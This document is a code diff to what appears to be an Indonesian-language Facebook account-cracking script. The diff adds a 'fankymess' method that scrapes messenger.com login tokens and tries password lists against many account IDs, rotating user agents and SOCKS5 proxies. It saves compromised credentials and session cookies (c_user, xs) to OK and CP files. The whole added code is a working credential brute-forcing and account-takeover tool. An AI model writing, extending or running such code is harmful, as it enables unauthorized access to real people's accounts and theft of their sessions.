@@ -817,12 +817,14 @@ def setting():
 
 
     # Input untuk metode login
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]IP[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]IP[bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]messenger[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
     fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
     if fankylog in ["1", "01"]:
         method.append("fankygraph")
     elif fankylog in ["2", "02"]:
         method.append("fankybapi")
+    elif fankylog in ["3", "03"]:
+        method.append("fankymess")
     else:
         method.append("fankybapi")  # Default metode
     # Pengaturan User-Agent
@@ -956,6 +958,8 @@ def metslow():
                     pool.submit(fankygraphv1,idf,pwv,'graph.facebook.com')
                 elif "fankybapi" in method:
                     pool.submit(fanky_b_api,idf,pwv)
+                elif "fankymess" in method:
+                    pool.submit(fankymess,idf,pwv)
                 else:
                     pool.submit(fanky_b_api,idf,pwv)
                                     
@@ -1023,6 +1027,8 @@ def metcepat():
                     pool.submit(fankygraphv1,idf,pwv,'graph.facebook.com')
                 elif "fankybapi" in method:
                     pool.submit(fanky_b_api,idf,pwv)
+                elif "fankymess" in method:
+                    pool.submit(fankymess,idf,pwv)
                 else:
                     pool.submit(fanky_b_api,idf,pwv)
     print("")
@@ -1039,6 +1045,63 @@ def metcepat():
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
 
+
+def fankymess(idf, pwv):
+    global loop, ok, cp
+    bo = random.choice([m, k, h, b, u, x])
+    rr = random.randint
+    rc = random.choice
+    ses = requests.Session()
+    prog.update(des, description=f" {K2}•{H2} FANKY MESS {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
+    prog.advance(des)
+    ua = random.choice(ugen)
+    for pw in pwv:
+        try:
+            if 'ya' in ualuh:
+                ua = ualu[0]
+            nip = random.choice(prox)
+            proxs = {'http': 'socks5://' + nip}
+            fanreq = ses.get("https://www.messenger.com/").text
+            headers = {"Host": "www.messenger.com", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control": "max-age=0", "content-type": "application/x-www-form-urlencoded", "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"", "sec-ch-ua-mobile": "?1", "sec-ch-ua-platform": "\"Linux\"", "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "same-origin", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "referrer": "https://www.messenger.com/", "referrerPolicy": "origin-when-cross-origin", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48"}
+            try:
+                jazoest = re.search('name="jazoest" value="(.*?)"', str(fanreq)).group(1)
+                lsd = re.search('name="lsd" value="(.*?)"', str(fanreq)).group(1)
+                initial_request_id = re.search('name="initial_request_id" value="(.*?)"', str(fanreq)).group(1)
+                lgnjs = re.search('name="lgnjs" value="(.*?)"', str(fanreq)).group(1)
+                lgnrnd = re.search('name="lgnrnd" value="(.*?)"', str(fanreq)).group(1)
+                lgndim = re.search('name="lgndim" value="(.*?)"', str(fanreq)).group(1)
+                jsdatr = re.search('"_js_datr","(.*?)"', str(fanreq)).group(1)
+            except Exception as e:
+                jsdatr = 'yO0-ZCbjUBWogjc-b4lEOOEw'
+            headers.update({'cookie': f'wl_cbv=v2%3Bclient_version%3A2215%3Btimestamp%3A{str(time.time())[:10]}; vpd=v1%3B646x360x2; m_pixel_ratio=2; _js_datr={jsdatr}'})
+            datainisayangku = {"jazoest": jazoest, "lsd": lsd, "initial_request_id": initial_request_id, "timezone": "", "lgndim": lgndim, "lgnrnd": lgnrnd, "lgnjs": lgnjs, "email": idf, "pass": pw, "login": 1, "persistent": 1, "default_persistent": ""}
+            po = ses.post("https://www.messenger.com/login/password/", data=datainisayangku, headers=headers, allow_redirects=True)
+            if 'checkpoint_interstitial' in po.url or 'https://www.messenger.com/login/checkpoint_interstitial/' in po.url:
+                cp += 1
+                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
+                break
+            elif 'c_user' in ses.cookies.get_dict().keys():
+                ok += 1
+                coki = ses.cookies.get_dict()
+                kuki = (f"datr={coki['datr']};sb={coki['sb']};locale=id_ID;c_user={coki['c_user']};xs={coki['xs']};fr={coki['fr']};")
+                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
+                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
+                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
+                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
+                prints(tree)
+                open("OK/" + okc, "a").write(idf + "|" + pw + "|" + kuki + "\n")
+                break
+            else:
+                continue
+        except requests.exceptions.ConnectionError:
+            time.sleep(31)
+    loop += 1
 
 #-------------------[ CRACK-MAIN ]------------#
 def fanb_graph(idf, pwv):
